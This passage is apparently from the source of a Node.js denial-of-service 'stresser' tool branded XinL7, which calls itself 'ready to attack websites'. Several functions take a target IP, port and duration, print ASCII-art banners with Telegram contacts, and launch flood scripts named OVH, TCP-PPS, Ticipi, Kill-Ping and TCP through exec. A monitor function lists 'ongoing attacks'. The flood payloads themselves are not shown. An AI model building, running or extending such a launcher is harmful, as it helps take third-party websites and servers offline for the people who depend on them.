⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑶𝑽𝑯 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/ovh.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function tcppps(args) {
  if (args.length < 3) {
    console.log(`Example: Tcp-Pps <Target> <Port> <Duration>
Tcp-Pps 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑪𝑷-𝑷𝑷𝑺 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcppps.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function ticipi(args) {
  if (args.length < 3) {
    console.log(`Example: Ticipi <Target> <Port> <Duration>
Ticipi 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑻𝑰𝑪𝑰𝑷𝑰 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/ticipi.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function pod(args) {
  if (args.length < 2) {
    console.log(`Example: Kill-Ping <Target> <Duration>
Kill-Ping 123.456.789.10 60`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : 𝑲𝑰𝑳𝑳 𝑷𝑰𝑵𝑮 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/killpingnew.js`);
exec(`node ${metode} ${target} 65507 6 1 ${duration}`)
sigma()
};
async function tcpbaru(args) {
  if (args.length < 3) {
    console.log(`Example: Tcp <Target> <Port> <Duration>
Tcp 123.456.78.910 22 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XinL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @L7XinID${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
𝑻𝑨𝑹𝑮𝑬𝑻   : ${target}
𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵 : ${duration}
𝑴𝑬𝑻𝑯𝑶𝑫𝑺  : TCP 𝑲𝑰𝑳𝑳𝑬𝑹
𝑪𝑹𝑬𝑨𝑻𝑶𝑹  : XinL7`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
}

const metode = path.join(__dirname, `/lib/cache/tcpnew.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function GoodBye(args) {
console.log(`𝑮𝒐𝒐𝒅𝑩𝒚𝒆 XinL7 Network Tools!!`)
process.exit(0);
}
// [========================================] //
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung🕊️🪽.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== 𝑶𝒏𝒈𝒐𝒊𝒏𝒈 𝑨𝒕𝒕𝒂𝒄𝒌𝒔 🕊🪽===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
